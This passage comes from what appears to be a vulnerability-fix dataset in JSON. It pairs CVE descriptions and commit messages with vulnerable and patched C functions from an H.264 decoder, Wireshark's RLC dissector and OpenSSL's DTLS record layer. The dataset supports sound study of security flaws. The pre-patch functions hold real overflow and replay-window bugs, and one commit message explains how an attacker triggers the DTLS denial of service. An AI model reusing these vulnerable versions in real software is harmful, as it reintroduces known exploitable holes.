        "diff_func": "--- func_before\n+++ func_after\n@@ -31,9 +31,23 @@\n         pStorage->activePps = pStorage->pps[ppsId];\n         pStorage->activeSpsId = pStorage->activePps->seqParameterSetId;\n         pStorage->activeSps = pStorage->sps[pStorage->activeSpsId];\n-        pStorage->picSizeInMbs =\n-            pStorage->activeSps->picWidthInMbs *\n-            pStorage->activeSps->picHeightInMbs;\n+\n+        /* report error before multiplication to prevent integer overflow */\n+        if (pStorage->activeSps->picWidthInMbs == 0)\n+        {\n+            pStorage->picSizeInMbs = 0;\n+        }\n+        else if (pStorage->activeSps->picHeightInMbs >\n+                 UINT32_MAX / pStorage->activeSps->picWidthInMbs)\n+        {\n+            return(MEMORY_ALLOCATION_ERROR);\n+        }\n+        else\n+        {\n+            pStorage->picSizeInMbs =\n+                pStorage->activeSps->picWidthInMbs *\n+                pStorage->activeSps->picHeightInMbs;\n+        }\n \n         pStorage->currImage->width = pStorage->activeSps->picWidthInMbs;\n         pStorage->currImage->height = pStorage->activeSps->picHeightInMbs;",
        "diff_line_info": {
            "deleted_lines": [
                "        pStorage->picSizeInMbs =",
                "            pStorage->activeSps->picWidthInMbs *",
                "            pStorage->activeSps->picHeightInMbs;"
            ],
            "added_lines": [
                "",
                "        /* report error before multiplication to prevent integer overflow */",
                "        if (pStorage->activeSps->picWidthInMbs == 0)",
                "        {",
                "            pStorage->picSizeInMbs = 0;",
                "        }",
                "        else if (pStorage->activeSps->picHeightInMbs >",
                "                 UINT32_MAX / pStorage->activeSps->picWidthInMbs)",
                "        {",
                "            return(MEMORY_ALLOCATION_ERROR);",
                "        }",
                "        else",
                "        {",
                "            pStorage->picSizeInMbs =",
                "                pStorage->activeSps->picWidthInMbs *",
                "                pStorage->activeSps->picHeightInMbs;",
                "        }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-6510",
        "func_name": "wireshark/rlc_decode_li",
        "description": "Off-by-one error in epan/dissectors/packet-rlc.c in the RLC dissector in Wireshark 1.12.x before 1.12.13 and 2.x before 2.0.5 allows remote attackers to cause a denial of service (stack-based buffer overflow and application crash) via a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/47a5fa850b388fcf4ea762073806f01b459820fe",
        "commit_title": "RLC: fix a stack overflow in rlc_decode_li function",
        "commit_text": " The test to check whether the array was full or not was off by 1  Bug: 12664",
        "func_before": "static gint16\nrlc_decode_li(enum rlc_mode mode, tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree,\n          struct rlc_li *li, guint8 max_li, gboolean li_on_2_bytes)\n{\n    guint8      ext, hdr_len, offs  = 0, num_li = 0, li_offs;\n    guint16     next_bytes, prev_li = 0;\n    proto_item *malformed;\n    guint16     total_len;\n\n    switch (mode) {\n        case RLC_AM:\n            offs = 1;\n            break;\n        case RLC_UM:\n            offs = 0;\n            break;\n        case RLC_TM:\n            /* fall through */\n        case RLC_UNKNOWN_MODE:\n        default:\n            return -1;\n    }\n    hdr_len = offs;\n    /* calculate header length */\n    ext = tvb_get_guint8(tvb, hdr_len++) & 0x01;\n    while (ext) {\n        next_bytes = li_on_2_bytes ? tvb_get_ntohs(tvb, hdr_len) : tvb_get_guint8(tvb, hdr_len);\n        ext = next_bytes & 0x01;\n        hdr_len += li_on_2_bytes ? 2 : 1;\n    }\n    total_len = tvb_captured_length_remaining(tvb, hdr_len);\n\n    /* do actual evaluation of LIs */\n    ext = tvb_get_guint8(tvb, offs++) & 0x01;\n    li_offs = offs;\n    while (ext) {\n        if (li_on_2_bytes) {\n            next_bytes = tvb_get_ntohs(tvb, offs);\n            offs += 2;\n        } else {\n            next_bytes = tvb_get_guint8(tvb, offs++);\n        }\n        ext = next_bytes & 0x01;\n        li[num_li].ext = ext;\n        li[num_li].li = next_bytes >> 1;\n\n        if (li_on_2_bytes) {\n            switch (li[num_li].li) {\n                case 0x0000: /* previous segment was the last one */\n                case 0x7ffb: /* previous PDU contains last segment of SDU (minus last byte) */\n                case 0x7ffe: /* contains piggybacked STATUS in AM or segment in UM */\n                case 0x7fff: /* padding */\n                    li[num_li].len = 0;\n                    break;\n                case 0x7ffa: /* contains exactly one SDU (minus last byte), UM only */\n                case 0x7ffc: /* start of a new SDU, UM only */\n                case 0x7ffd: /* contains exactly one SDU, UM only */\n                    if (mode == RLC_UM) {\n                        /* valid for UM */\n                        li[num_li].len = 0;\n                        break;\n                    }\n                    /*invalid for AM */\n                    /* add malformed LI for investigation */\n                    malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                    expert_add_info(pinfo, malformed, &ei_rlc_li_reserved);\n                    return -1; /* just give up on this */\n                default:\n                    /* since the LI is an offset (from the end of the header), it\n                    * may not be larger than the total remaining length and no\n                    * LI may be smaller than its preceding one\n                    */\n                    if (((li[num_li].li > total_len) && !global_rlc_headers_expected)\n                        || (li[num_li].li < prev_li)) {\n                        /* add malformed LI for investigation */\n                        malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                        expert_add_info(pinfo, malformed, &ei_rlc_li_incorrect_warn);\n                        return -1; /* just give up on this */\n                    }\n                    li[num_li].len = li[num_li].li - prev_li;\n                    prev_li = li[num_li].li;\n            }\n        } else {\n            switch (li[num_li].li) {\n                case 0x00: /* previous segment was the last one */\n                case 0x7e: /* contains piggybacked STATUS in AM or segment in UM */\n                case 0x7f: /* padding */\n                    li[num_li].len = 0;\n                    break;\n                case 0x7c: /* start of a new SDU, UM only */\n                case 0x7d: /* contains exactly one SDU, UM only */\n                    if (mode == RLC_UM) {\n                        /* valid for UM */\n                        li[num_li].len = 0;\n                        break;\n                    }\n                    /*invalid for AM */\n                    /* add malformed LI for investigation */\n                    malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                    expert_add_info(pinfo, malformed, &ei_rlc_li_reserved);\n                    return -1; /* just give up on this */\n                default:\n                    /* since the LI is an offset (from the end of the header), it\n                    * may not be larger than the total remaining length and no\n                    * LI may be smaller than its preceding one\n                    */\n                    li[num_li].len = li[num_li].li - prev_li;\n                    if (((li[num_li].li > total_len) && !global_rlc_headers_expected)\n                        || (li[num_li].li < prev_li)) {\n                        /* add malformed LI for investigation */\n                        malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                        expert_add_info_format(pinfo, malformed, &ei_rlc_li_incorrect_mal, \"Incorrect LI value 0x%x\", li[num_li].li);\n                        return -1; /* just give up on this */\n                    }\n                    prev_li = li[num_li].li;\n            }\n        }\n        li[num_li].tree = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n        num_li++;\n\n        if (num_li > max_li) {\n            /* OK, so this is not really a malformed packet, but for now,\n            * we will treat it as such, so that it is marked in some way */\n            expert_add_info(pinfo, li[num_li-1].tree, &ei_rlc_li_too_many);\n            return -1;\n        }\n    }\n    return num_li;\n}",
        "func": "static gint16\nrlc_decode_li(enum rlc_mode mode, tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree,\n          struct rlc_li *li, guint8 max_li, gboolean li_on_2_bytes)\n{\n    guint8      ext, hdr_len, offs  = 0, num_li = 0, li_offs;\n    guint16     next_bytes, prev_li = 0;\n    proto_item *malformed;\n    guint16     total_len;\n\n    switch (mode) {\n        case RLC_AM:\n            offs = 1;\n            break;\n        case RLC_UM:\n            offs = 0;\n            break;\n        case RLC_TM:\n            /* fall through */\n        case RLC_UNKNOWN_MODE:\n        default:\n            return -1;\n    }\n    hdr_len = offs;\n    /* calculate header length */\n    ext = tvb_get_guint8(tvb, hdr_len++) & 0x01;\n    while (ext) {\n        next_bytes = li_on_2_bytes ? tvb_get_ntohs(tvb, hdr_len) : tvb_get_guint8(tvb, hdr_len);\n        ext = next_bytes & 0x01;\n        hdr_len += li_on_2_bytes ? 2 : 1;\n    }\n    total_len = tvb_captured_length_remaining(tvb, hdr_len);\n\n    /* do actual evaluation of LIs */\n    ext = tvb_get_guint8(tvb, offs++) & 0x01;\n    li_offs = offs;\n    while (ext) {\n        if (li_on_2_bytes) {\n            next_bytes = tvb_get_ntohs(tvb, offs);\n            offs += 2;\n        } else {\n            next_bytes = tvb_get_guint8(tvb, offs++);\n        }\n        ext = next_bytes & 0x01;\n        li[num_li].ext = ext;\n        li[num_li].li = next_bytes >> 1;\n\n        if (li_on_2_bytes) {\n            switch (li[num_li].li) {\n                case 0x0000: /* previous segment was the last one */\n                case 0x7ffb: /* previous PDU contains last segment of SDU (minus last byte) */\n                case 0x7ffe: /* contains piggybacked STATUS in AM or segment in UM */\n                case 0x7fff: /* padding */\n                    li[num_li].len = 0;\n                    break;\n                case 0x7ffa: /* contains exactly one SDU (minus last byte), UM only */\n                case 0x7ffc: /* start of a new SDU, UM only */\n                case 0x7ffd: /* contains exactly one SDU, UM only */\n                    if (mode == RLC_UM) {\n                        /* valid for UM */\n                        li[num_li].len = 0;\n                        break;\n                    }\n                    /*invalid for AM */\n                    /* add malformed LI for investigation */\n                    malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                    expert_add_info(pinfo, malformed, &ei_rlc_li_reserved);\n                    return -1; /* just give up on this */\n                default:\n                    /* since the LI is an offset (from the end of the header), it\n                    * may not be larger than the total remaining length and no\n                    * LI may be smaller than its preceding one\n                    */\n                    if (((li[num_li].li > total_len) && !global_rlc_headers_expected)\n                        || (li[num_li].li < prev_li)) {\n                        /* add malformed LI for investigation */\n                        malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                        expert_add_info(pinfo, malformed, &ei_rlc_li_incorrect_warn);\n                        return -1; /* just give up on this */\n                    }\n                    li[num_li].len = li[num_li].li - prev_li;\n                    prev_li = li[num_li].li;\n            }\n        } else {\n            switch (li[num_li].li) {\n                case 0x00: /* previous segment was the last one */\n                case 0x7e: /* contains piggybacked STATUS in AM or segment in UM */\n                case 0x7f: /* padding */\n                    li[num_li].len = 0;\n                    break;\n                case 0x7c: /* start of a new SDU, UM only */\n                case 0x7d: /* contains exactly one SDU, UM only */\n                    if (mode == RLC_UM) {\n                        /* valid for UM */\n                        li[num_li].len = 0;\n                        break;\n                    }\n                    /*invalid for AM */\n                    /* add malformed LI for investigation */\n                    malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                    expert_add_info(pinfo, malformed, &ei_rlc_li_reserved);\n                    return -1; /* just give up on this */\n                default:\n                    /* since the LI is an offset (from the end of the header), it\n                    * may not be larger than the total remaining length and no\n                    * LI may be smaller than its preceding one\n                    */\n                    li[num_li].len = li[num_li].li - prev_li;\n                    if (((li[num_li].li > total_len) && !global_rlc_headers_expected)\n                        || (li[num_li].li < prev_li)) {\n                        /* add malformed LI for investigation */\n                        malformed = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n                        expert_add_info_format(pinfo, malformed, &ei_rlc_li_incorrect_mal, \"Incorrect LI value 0x%x\", li[num_li].li);\n                        return -1; /* just give up on this */\n                    }\n                    prev_li = li[num_li].li;\n            }\n        }\n        li[num_li].tree = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n        num_li++;\n\n        if (num_li >= max_li) {\n            /* OK, so this is not really a malformed packet, but for now,\n            * we will treat it as such, so that it is marked in some way */\n            expert_add_info(pinfo, li[num_li-1].tree, &ei_rlc_li_too_many);\n            return -1;\n        }\n    }\n    return num_li;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -118,7 +118,7 @@\n         li[num_li].tree = tree_add_li(mode, &li[num_li], num_li, li_offs, li_on_2_bytes, tvb, tree);\n         num_li++;\n \n-        if (num_li > max_li) {\n+        if (num_li >= max_li) {\n             /* OK, so this is not really a malformed packet, but for now,\n             * we will treat it as such, so that it is marked in some way */\n             expert_add_info(pinfo, li[num_li-1].tree, &ei_rlc_li_too_many);",
        "diff_line_info": {
            "deleted_lines": [
                "        if (num_li > max_li) {"
            ],
            "added_lines": [
                "        if (num_li >= max_li) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2181",
        "func_name": "openssl/dtls1_process_buffered_records",
        "description": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.",
        "git_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770",
        "commit_title": "",
        "commit_text": "Fix DTLS replay protection  The DTLS implementation provides some protection against replay attacks in accordance with RFC6347 section 4.1.2.6.  A sliding \"window\" of valid record sequence numbers is maintained with the \"right\" hand edge of the window set to the highest sequence number we have received so far. Records that arrive that are off the \"left\" hand edge of the window are rejected. Records within the window are checked against a list of records received so far. If we already received it then we also reject the new record.  If we have not already received the record, or the sequence number is off the right hand edge of the window then we verify the MAC of the record. If MAC verification fails then we discard the record. Otherwise we mark the record as received. If the sequence number was off the right hand edge of the window, then we slide the window along so that the right hand edge is in line with the newly received sequence number.  Records may arrive for future epochs, i.e. a record from after a CCS being sent, can arrive before the CCS does if the packets get re-ordered. As we have not yet received the CCS we are not yet in a position to decrypt or validate the MAC of those records. OpenSSL places those records on an unprocessed records queue. It additionally updates the window immediately, even though we have not yet verified the MAC. This will only occur if currently in a handshake/renegotiation.  This could be exploited by an attacker by sending a record for the next epoch (which does not have to decrypt or have a valid MAC), with a very large sequence number. This means the right hand edge of the window is moved very far to the right, and all subsequent legitimate packets are dropped causing a denial of service.  A similar effect can be achieved during the initial handshake. In this case there is no MAC key negotiated yet. Therefore an attacker can send a message for the current epoch with a very large sequence number. The code will process the record as normal. If the hanshake message sequence number (as opposed to the record sequence number that we have been talking about so far) is in the future then the injected message is bufferred to be handled later, but the window is still updated. Therefore all subsequent legitimate handshake records are dropped. This aspect is not considered a security issue because there are many ways for an attacker to disrupt the initial handshake and prevent it from completing successfully (e.g. injection of a handshake message will cause the Finished MAC to fail and the handshake to be aborted). This issue comes about as a result of trying to do replay protection, but having no integrity mechanism in place yet. Does it even make sense to have replay protection in epoch 0? That issue isn't addressed here though.  This addressed an OCAP Audit issue.  CVE-2016-2181  ",
        "func_before": "int dtls1_process_buffered_records(SSL *s)\n{\n    pitem *item;\n    SSL3_BUFFER *rb;\n\n    item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n    if (item) {\n        /* Check if epoch is current. */\n        if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n            return (1);         /* Nothing to do. */\n\n        rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n\n        if (SSL3_BUFFER_get_left(rb) > 0) {\n            /*\n             * We've still got data from the current packet to read. There could\n             * be a record from the new epoch in it - so don't overwrite it\n             * with the unprocessed records yet (we'll do it when we've\n             * finished reading the current packet).\n             */\n            return 1;\n        }\n\n        /* Process all the records. */\n        while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n            dtls1_get_unprocessed_record(s);\n            if (!dtls1_process_record(s))\n                return (0);\n            if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n                                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) <\n                0)\n                return -1;\n        }\n    }\n\n    /*\n     * sync epoch numbers once all the unprocessed records have been\n     * processed\n     */\n    s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n    s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n\n    return (1);\n}",
        "func": "int dtls1_process_buffered_records(SSL *s)\n{\n    pitem *item;\n    SSL3_BUFFER *rb;\n    SSL3_RECORD *rr;\n    DTLS1_BITMAP *bitmap;\n    unsigned int is_next_epoch;\n    int replayok = 1;\n\n    item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n    if (item) {\n        /* Check if epoch is current. */\n        if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n            return 1;         /* Nothing to do. */\n\n        rr = RECORD_LAYER_get_rrec(&s->rlayer);\n\n        rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n\n        if (SSL3_BUFFER_get_left(rb) > 0) {\n            /*\n             * We've still got data from the current packet to read. There could\n             * be a record from the new epoch in it - so don't overwrite it\n             * with the unprocessed records yet (we'll do it when we've\n             * finished reading the current packet).\n             */\n            return 1;\n        }\n\n        /* Process all the records. */\n        while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n            dtls1_get_unprocessed_record(s);\n            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n            if (bitmap == NULL) {\n                /*\n                 * Should not happen. This will only ever be NULL when the\n                 * current record is from a different epoch. But that cannot\n                 * be the case because we already checked the epoch above\n                 */\n                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,\n                        ERR_R_INTERNAL_ERROR);\n                 return 0;\n            }\n#ifndef OPENSSL_NO_SCTP\n            /* Only do replay check if no SCTP bio */\n            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))\n#endif\n            {\n                /*\n                 * Check whether this is a repeat, or aged record. We did this\n                 * check once already when we first received the record - but\n                 * we might have updated the window since then due to\n                 * records we subsequently processed.\n                 */\n                replayok = dtls1_record_replay_check(s, bitmap);\n            }\n\n            if (!replayok || !dtls1_process_record(s, bitmap)) {\n                /* dump this record */\n                rr->length = 0;\n                RECORD_LAYER_reset_packet_length(&s->rlayer);\n                continue;\n            }\n\n            if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)\n                return 0;\n        }\n    }\n\n    /*\n     * sync epoch numbers once all the unprocessed records have been\n     * processed\n     */\n    s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n    s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n\n    return 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,12 +2,18 @@\n {\n     pitem *item;\n     SSL3_BUFFER *rb;\n+    SSL3_RECORD *rr;\n+    DTLS1_BITMAP *bitmap;\n+    unsigned int is_next_epoch;\n+    int replayok = 1;\n \n     item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n     if (item) {\n         /* Check if epoch is current. */\n         if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n-            return (1);         /* Nothing to do. */\n+            return 1;         /* Nothing to do. */\n+\n+        rr = RECORD_LAYER_get_rrec(&s->rlayer);\n \n         rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n \n@@ -24,12 +30,41 @@\n         /* Process all the records. */\n         while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n             dtls1_get_unprocessed_record(s);\n-            if (!dtls1_process_record(s))\n-                return (0);\n+            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n+            if (bitmap == NULL) {\n+                /*\n+                 * Should not happen. This will only ever be NULL when the\n+                 * current record is from a different epoch. But that cannot\n+                 * be the case because we already checked the epoch above\n+                 */\n+                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,\n+                        ERR_R_INTERNAL_ERROR);\n+                 return 0;\n+            }\n+#ifndef OPENSSL_NO_SCTP\n+            /* Only do replay check if no SCTP bio */\n+            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))\n+#endif\n+            {\n+                /*\n+                 * Check whether this is a repeat, or aged record. We did this\n+                 * check once already when we first received the record - but\n+                 * we might have updated the window since then due to\n+                 * records we subsequently processed.\n+                 */\n+                replayok = dtls1_record_replay_check(s, bitmap);\n+            }\n+\n+            if (!replayok || !dtls1_process_record(s, bitmap)) {\n+                /* dump this record */\n+                rr->length = 0;\n+                RECORD_LAYER_reset_packet_length(&s->rlayer);\n+                continue;\n+            }\n+\n             if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n-                                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) <\n-                0)\n-                return -1;\n+                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)\n+                return 0;\n         }\n     }\n \n@@ -40,5 +75,5 @@\n     s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n     s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n \n-    return (1);\n+    return 1;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "            return (1);         /* Nothing to do. */",
                "            if (!dtls1_process_record(s))",
                "                return (0);",
                "                                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) <",
                "                0)",
                "                return -1;",
                "    return (1);"
            ],
            "added_lines": [
                "    SSL3_RECORD *rr;",
                "    DTLS1_BITMAP *bitmap;",
                "    unsigned int is_next_epoch;",
                "    int replayok = 1;",
                "            return 1;         /* Nothing to do. */",
                "",
                "        rr = RECORD_LAYER_get_rrec(&s->rlayer);",
                "            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);",
                "            if (bitmap == NULL) {",
                "                /*",
                "                 * Should not happen. This will only ever be NULL when the",
                "                 * current record is from a different epoch. But that cannot",
                "                 * be the case because we already checked the epoch above",
                "                 */",
                "                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,",
                "                        ERR_R_INTERNAL_ERROR);",
                "                 return 0;",
                "            }",
                "#ifndef OPENSSL_NO_SCTP",
                "            /* Only do replay check if no SCTP bio */",
                "            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))",
                "#endif",
                "            {",
                "                /*",
                "                 * Check whether this is a repeat, or aged record. We did this",
                "                 * check once already when we first received the record - but",
                "                 * we might have updated the window since then due to",
                "                 * records we subsequently processed.",
                "                 */",
                "                replayok = dtls1_record_replay_check(s, bitmap);",
                "            }",
                "",
                "            if (!replayok || !dtls1_process_record(s, bitmap)) {",
                "                /* dump this record */",
                "                rr->length = 0;",
                "                RECORD_LAYER_reset_packet_length(&s->rlayer);",
                "                continue;",
                "            }",
                "",
                "                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)",
                "                return 0;",
                "    return 1;"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2181",
        "func_name": "openssl/dtls1_get_record",
        "description": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.",
        "git_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770",
        "commit_title": "",
        "commit_text": "Fix DTLS replay protection  The DTLS implementation provides some protection against replay attacks in accordance with RFC6347 section 4.1.2.6.  A sliding \"window\" of valid record sequence numbers is maintained with the \"right\" hand edge of the window set to the highest sequence number we have received so far. Records that arrive that are off the \"left\" hand edge of the window are rejected. Records within the window are checked against a list of records received so far. If we already received it then we also reject the new record.  If we have not already received the record, or the sequence number is off the right hand edge of the window then we verify the MAC of the record. If MAC verification fails then we discard the record. Otherwise we mark the record as received. If the sequence number was off the right hand edge of the window, then we slide the window along so that the right hand edge is in line with the newly received sequence number.  Records may arrive for future epochs, i.e. a record from after a CCS being sent, can arrive before the CCS does if the packets get re-ordered. As we have not yet received the CCS we are not yet in a position to decrypt or validate the MAC of those records. OpenSSL places those records on an unprocessed records queue. It additionally updates the window immediately, even though we have not yet verified the MAC. This will only occur if currently in a handshake/renegotiation.  This could be exploited by an attacker by sending a record for the next epoch (which does not have to decrypt or have a valid MAC), with a very large sequence number. This means the right hand edge of the window is moved very far to the right, and all subsequent legitimate packets are dropped causing a denial of service.  A similar effect can be achieved during the initial handshake. In this case there is no MAC key negotiated yet. Therefore an attacker can send a message for the current epoch with a very large sequence number. The code will process the record as normal. If the hanshake message sequence number (as opposed to the record sequence number that we have been talking about so far) is in the future then the injected message is bufferred to be handled later, but the window is still updated. Therefore all subsequent legitimate handshake records are dropped. This aspect is not considered a security issue because there are many ways for an attacker to disrupt the initial handshake and prevent it from completing successfully (e.g. injection of a handshake message will cause the Finished MAC to fail and the handshake to be aborted). This issue comes about as a result of trying to do replay protection, but having no integrity mechanism in place yet. Does it even make sense to have replay protection in epoch 0? That issue isn't addressed here though.  This addressed an OCAP Audit issue.  CVE-2016-2181  ",
        "func_before": "int dtls1_get_record(SSL *s)\n{\n    int ssl_major, ssl_minor;\n    int i, n;\n    SSL3_RECORD *rr;\n    unsigned char *p = NULL;\n    unsigned short version;\n    DTLS1_BITMAP *bitmap;\n    unsigned int is_next_epoch;\n\n    rr = RECORD_LAYER_get_rrec(&s->rlayer);\n\n again:\n    /*\n     * The epoch may have changed.  If so, process all the pending records.\n     * This is a non-blocking operation.\n     */\n    if (dtls1_process_buffered_records(s) < 0)\n        return -1;\n\n    /* if we're renegotiating, then there may be buffered records */\n    if (dtls1_get_processed_record(s))\n        return 1;\n\n    /* get something from the wire */\n\n    /* check if we have the header */\n    if ((RECORD_LAYER_get_rstate(&s->rlayer) != SSL_ST_READ_BODY) ||\n        (RECORD_LAYER_get_packet_length(&s->rlayer) < DTLS1_RT_HEADER_LENGTH)) {\n        n = ssl3_read_n(s, DTLS1_RT_HEADER_LENGTH,\n                        SSL3_BUFFER_get_len(&s->rlayer.rbuf), 0, 1);\n        /* read timeout is handled by dtls1_read_bytes */\n        if (n <= 0)\n            return (n);         /* error or non-blocking */\n\n        /* this packet contained a partial record, dump it */\n        if (RECORD_LAYER_get_packet_length(&s->rlayer) !=\n            DTLS1_RT_HEADER_LENGTH) {\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        RECORD_LAYER_set_rstate(&s->rlayer, SSL_ST_READ_BODY);\n\n        p = RECORD_LAYER_get_packet(&s->rlayer);\n\n        if (s->msg_callback)\n            s->msg_callback(0, 0, SSL3_RT_HEADER, p, DTLS1_RT_HEADER_LENGTH,\n                            s, s->msg_callback_arg);\n\n        /* Pull apart the header into the DTLS1_RECORD */\n        rr->type = *(p++);\n        ssl_major = *(p++);\n        ssl_minor = *(p++);\n        version = (ssl_major << 8) | ssl_minor;\n\n        /* sequence number is 64 bits, with top 2 bytes = epoch */\n        n2s(p, rr->epoch);\n\n        memcpy(&(RECORD_LAYER_get_read_sequence(&s->rlayer)[2]), p, 6);\n        p += 6;\n\n        n2s(p, rr->length);\n\n        /* Lets check version */\n        if (!s->first_packet) {\n            if (version != s->version) {\n                /* unexpected version, silently discard */\n                rr->length = 0;\n                RECORD_LAYER_reset_packet_length(&s->rlayer);\n                goto again;\n            }\n        }\n\n        if ((version & 0xff00) != (s->version & 0xff00)) {\n            /* wrong version, silently discard record */\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        if (rr->length > SSL3_RT_MAX_ENCRYPTED_LENGTH) {\n            /* record too long, silently discard it */\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        /* now s->rlayer.rstate == SSL_ST_READ_BODY */\n    }\n\n    /* s->rlayer.rstate == SSL_ST_READ_BODY, get and decode the data */\n\n    if (rr->length >\n        RECORD_LAYER_get_packet_length(&s->rlayer) - DTLS1_RT_HEADER_LENGTH) {\n        /* now s->packet_length == DTLS1_RT_HEADER_LENGTH */\n        i = rr->length;\n        n = ssl3_read_n(s, i, i, 1, 1);\n        /* this packet contained a partial record, dump it */\n        if (n != i) {\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        /*\n         * now n == rr->length, and s->packet_length ==\n         * DTLS1_RT_HEADER_LENGTH + rr->length\n         */\n    }\n    /* set state for later operations */\n    RECORD_LAYER_set_rstate(&s->rlayer, SSL_ST_READ_HEADER);\n\n    /* match epochs.  NULL means the packet is dropped on the floor */\n    bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n    if (bitmap == NULL) {\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n        goto again;             /* get another record */\n    }\n#ifndef OPENSSL_NO_SCTP\n    /* Only do replay check if no SCTP bio */\n    if (!BIO_dgram_is_sctp(SSL_get_rbio(s))) {\n#endif\n        /* Check whether this is a repeat, or aged record. */\n        if (!dtls1_record_replay_check(s, bitmap)) {\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n            goto again;         /* get another record */\n        }\n#ifndef OPENSSL_NO_SCTP\n    }\n#endif\n\n    /* just read a 0 length packet */\n    if (rr->length == 0)\n        goto again;\n\n    /*\n     * If this record is from the next epoch (either HM or ALERT), and a\n     * handshake is currently in progress, buffer it since it cannot be\n     * processed at this time.\n     */\n    if (is_next_epoch) {\n        if ((SSL_in_init(s) || ossl_statem_get_in_handshake(s))) {\n            if (dtls1_buffer_record\n                (s, &(DTLS_RECORD_LAYER_get_unprocessed_rcds(&s->rlayer)),\n                 rr->seq_num) < 0)\n                return -1;\n            /* Mark receipt of record. */\n            dtls1_record_bitmap_update(s, bitmap);\n        }\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto again;\n    }\n\n    if (!dtls1_process_record(s)) {\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n        goto again;             /* get another record */\n    }\n    dtls1_record_bitmap_update(s, bitmap); /* Mark receipt of record. */\n\n    return (1);\n\n}",
